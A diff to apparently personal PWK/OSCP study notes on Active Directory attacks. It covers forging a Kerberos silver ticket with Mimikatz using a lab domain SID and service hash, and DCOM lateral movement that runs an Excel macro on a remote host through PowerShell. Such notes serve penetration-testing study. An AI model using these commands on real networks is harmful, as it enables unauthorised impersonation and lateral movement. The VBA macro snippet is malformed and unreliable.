@@ -2241,12 +2241,93 @@ python /usr/share/kerberoast/tgsrepcrack.py wordlist.txt <TGS ticketFile>
       (PWK)
       #+end_quote 
 
-      - in other words, the application server trust the TGS blindly. Which means, knowing the service NTLM hash, a TGS with any level of access (any group membership) could be forged. This custom-created ticket is known as a *silver ticket* . "If the specific SPN is used on multiple servers, the silver can be leveraged against them all." (PWK, p663)
+      - in other words, the application server trust the TGS blindly, because the TGS is encrypted with the NTLM hash of the service account, which in theory is only known to the application server and domain controllers.
+      
+      - Which means, knowing the service NTLM hash, a TGS with any level of access (any group membership) could be forged. This custom-created ticket is known as a *silver ticket* . "If the specific SPN is used on multiple servers, the silver can be leveraged against them all." (PWK, p663)
 
     + src:
     #+begin_src
-      ## forge a ticket with Mimikatz kerberos::golden command.
+      ## forge a ticket and inject directly to the memory with Mimikatz *kerberos::golden* command.
+
+      ## 1. get the *SID of the domain*.
+    C:\>whoami /user
+      ##  USER INFORMATION
+      ##  ----------------
+      ##  User Name   SID
+      ##  ==========================================
+      ##  corp\offsec S-1-5-21-1602875587-2787523311-2599479668-1103
+      ##              |----------- SID of the domain ---------|-RID-|
+      ## the last bits "1103" is the RID: (The portion of a security identifier (SID) that identifies a user or group in relation to the authority that issued the SID. (MS doc RID))
+
+      ## 2. The silver ticket command requires a username (/user), domain name (/domain), the domain SID (/sid), the fully qualified host name of the service (/target), the service type (/service:HTTP), and the password hash of the iis_service service account (/rc4). Finally, the generated silver ticket is injected directly into memory with the /ppt flag (PWK p664). 
+    mimikatz # kerberos::purge 
+    mimikatz # kerberos::list
+    mimikatz #  kerberos::golden /user:offsec /domain:corp.com /sid:S-1-5-21-1602875587-2787523311-2599479668 /target:CorpWebServer.corp.com /service:HTTP /rc4:E2B475C11DA2A0748290D87AA966C327 /ptt
+    mimikatz # kerberos::list
     #+end_src 
+    //TODO PWK p665 practice
+
+*** Distributed Component Object Model (DCOM) exploit
+    + doc:
+      - abuse Windows Management Instrumentation 
+        - [[https://www.blackhat.com/docs/us-15/materials/us-15-Graeber-Abusing-Windows-Management- Instrumentation-WMI-To-Build-A-Persistent%20Asynchronous-And-Fileless-Backdoor-wp.pdf]]
+        - [[https://www.trustedsec.com/blog/new-tool-spraywmi-mass-wmi-pwnage/]]
+        - [[https://github.com/trustedsec/spraywmi][python wmi]]
+
+      - PowerShell Remoting
+        - [[https://msdn.microsoft.com/en-us/library/aa384426(v=vs.85).aspx]]
+        - [[http://www.harmj0y.net/blog/empire/expanding-your-empire/]]
+
+    + info:
+    #+begin_quote
+    The Microsoft Component Object Model (COM) is a system for creating software components that interact with each other. While COM was created for either same-process or cross-process interaction, it was extended to Distributed Component Object Model (DCOM) for interaction between multiple computers over a network.
+
+    Both COM and DCOM are very old technologies dating back to the very first editions of Windows.684 Interaction with DCOM is performed over RPC on TCP port 135 and local administrator access is required to call the DCOM Service Control Manager, which is essentially an API.
+    (PWK 666) 
+    #+end_quote
+
+    #+begin_quote
+    DCOM objects related to Microsoft Office allow lateral movement, both through the use of Outlook as well as PowerPoint.
+    (PWK 666) 
+    #+end_quote
+      - [[https://enigma0x3.net/2017/11/16/lateral-movement-using-outlooks-createobject-method-and-dotnettojscript/][lateral movement using outlooks]]
+      - [[https://attactics.org/2018/02/dcom-lateral-movement-powerpoint/][lateeral movement with PowerPoint and dcom]]
+
+    + src: TODO
+    #+begin_src powershell
+      ## first, instantiate the com object and list its available methods.
+    $com = [activator]::CreateInstance([type]::GetTypeFromProgId("Excel.Application", "192.168.1.110"))
+        ## System.Activator class, CreateInstance(Type type)
+        ## [[https://msdn.microsoft.com/en-us/library/wccyzw83(v=vs.110).aspx]]
+        ## the "progID" format: <Program>.<Component>.<Version>
+        ## the "progID" location: HKEY_LOCAL_MACHINE\SOFTWARE\Classes\{ProgID}
+        ## entries thas has child entry "CLSID" could be accessed using the method. e.g. [type]::GetTypeFromProgId("EMAIL2", "127.0.0.1")
+        ## [[https://docs.microsoft.com/en-us/windows/win32/com/-progid--key]]
+        ## the CLSID, could be viewed in OLE/COM Object Viewer from Windows 10 sdk. bin location: C:\Program Files (x86)\Windows Kits\10\bin\<sdkVersion>\x86\oleview.exe
+    $com | Get-Member
+      ## $com.Run
+
+    #+end_src 
+
+    #+begin_src vba
+      ## .xls macro, macro name: openNotePad
+    SubEndmymacro()
+      Shell ("notepad.exe") 
+    Sub 
+    #+end_src
+
+    #+begin_src powershell
+    $path = "C:\myexcel.xls"
+    $wb = $com.Workbooks.Open($path) 
+    $com.Run("openNotePad")
+    #+end_src
+
+    + ref:
+      - $com is SYSTEM, since it is instantiated through DCOM [[https://enigma0x3.net/2017/09/11/lateral-movement-using-excel-application-and-dcom/]]
+      //TODO
+      - tools:
+        - dcomcnfg.exe
+        - [[https://github.com/tyranid/oleviewdotnet][OleView.exe]]
     
 
 * TODO list
